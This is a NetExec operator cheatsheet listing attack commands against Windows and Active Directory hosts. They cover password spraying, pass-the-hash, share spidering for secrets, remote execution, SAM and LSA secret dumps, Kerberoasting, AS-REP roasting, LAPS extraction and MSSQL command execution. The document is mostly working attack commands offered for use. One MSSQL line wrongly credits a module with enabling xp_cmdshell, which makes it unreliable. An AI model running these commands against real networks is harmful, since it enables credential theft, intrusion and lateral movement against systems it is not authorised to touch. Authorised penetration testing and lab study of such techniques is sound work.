# ⚡ NetExec (nxc) Operator Cheatsheet

NetExec (the official successor to CrackMapExec) is the Swiss Army knife for pentesting and assessing Windows / Active Directory environments across multiple protocols.

---

### SMB Protocol Operations

```bash
# Host discovery and SMB signing verification
nxc smb 192.168.56.0/24

# Generate list of hosts with SMB signing disabled (for relaying)
nxc smb 192.168.56.0/24 --gen-relay-list smb_relay_targets.txt

# Password Spraying (checks each password against all users, observing lockout thresholds)
nxc smb 192.168.56.10 -u users.txt -p 'Spring2025!' --continue-on-success

# Verify single credential set across subnet
nxc smb 192.168.56.0/24 -u 'jdoe' -p 'Welcome2025!'

# Pass-the-Hash (PtH) verification
nxc smb 192.168.56.0/24 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:afff6209e51e70e9f80...'

# Check Domain Password Policy
nxc smb 192.168.56.10 -u 'jdoe' -p 'Welcome2025!' --pass-pol

# Enumerate active logged-on users and sessions
nxc smb 192.168.56.0/24 -u 'jdoe' -p 'Welcome2025!' --loggedon-users

# Enumerate open SMB shares and check permissions
nxc smb 192.168.56.0/24 -u 'jdoe' -p 'Welcome2025!' --shares

# Spider shares for confidential keywords (passwords, config, vpn, id_rsa)
nxc smb 192.168.56.10 -u 'jdoe' -p 'Welcome2025!' -M spider_plus -o OUTPUT_FOLDER=/tmp/nxc_spider

# Remote command execution (WMI method)
nxc smb 192.168.56.20 -u 'Administrator' -p 'AdminMaster2025!' --exec-method wmiexec -x "whoami"

# Dump local SAM hashes (requires Administrator / Pwn3d! status)
nxc smb 192.168.56.20 -u 'Administrator' -p 'AdminMaster2025!' --sam

# Dump LSA secrets
nxc smb 192.168.56.20 -u 'Administrator' -p 'AdminMaster2025!' --lsa
```

---

### WinRM Protocol Operations (Port 5985 / 5986)

```bash
# Verify WinRM access across network
nxc winrm 192.168.56.0/24 -u 'jdoe' -p 'Welcome2025!'

# Execute remote PowerShell command over WinRM
nxc winrm 192.168.56.21 -u 'itadmin' -p 'AdminMaster2025!' -X '$PSVersionTable'
```

---

### LDAP Protocol Operations (Port 389 / 636)

```bash
# Dump all active domain users and user descriptions
nxc ldap 192.168.56.10 -u 'jdoe' -p 'Welcome2025!' --users

# Search for AS-REP Roastable accounts (pre-auth disabled)
nxc ldap 192.168.56.10 -u 'jdoe' -p 'Welcome2025!' --asreproast asrep_hashes.txt

# Search for Kerberoastable accounts (SPNs registered)
nxc ldap 192.168.56.10 -u 'jdoe' -p 'Welcome2025!' --kerberoasting kerberoast_hashes.txt

# Extract LAPS passwords across domain workstations (requires LAPS read permission)
nxc ldap 192.168.56.10 -u 'itadmin' -p 'AdminMaster2025!' --laps
```

---

### MSSQL Protocol Operations (Port 1433)

```bash
# Authenticate to MSSQL using domain credentials
nxc mssql 192.168.56.25 -u 'jdoe' -p 'Welcome2025!' -d corp.local

# Check if current user is sysadmin on SQL instance
nxc mssql 192.168.56.25 -u 'svc_sql' -p 'DatabaseAdmin!2024' -d corp.local -q "SELECT IS_SRVROLEMEMBER('sysadmin')"

# Enable xp_cmdshell and execute command on underlying Windows host
nxc mssql 192.168.56.25 -u 'svc_sql' -p 'DatabaseAdmin!2024' -d corp.local -M slink -x "whoami"
```
